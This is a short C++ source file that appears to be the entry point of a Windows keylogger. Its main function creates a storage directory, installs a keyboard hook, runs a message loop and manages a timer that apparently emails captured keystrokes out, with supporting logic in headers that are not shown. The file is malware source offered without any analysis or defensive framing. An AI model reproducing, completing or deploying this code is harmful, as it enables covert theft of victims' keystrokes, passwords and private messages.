#include <iostream>
#include <windows.h>
#include "headers/KeyConstants.hpp"
#include "headers/Base64.hpp"
#include "headers/IO.hpp"
#include "headers/Timer.hpp"
#include "headers/SendMail.hpp"
#include "headers/KeyHooks.hpp"

int main(){
    MSG Msg;
    IO::make_dir(IO::get_path(true));
    IO::make_falses_dir();
    Hook::install_hook();
    while(GetMessage(&Msg, nullptr, 0, 0)){
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    Hook::timer_for_mail.stop_timer();
    return 0;
}
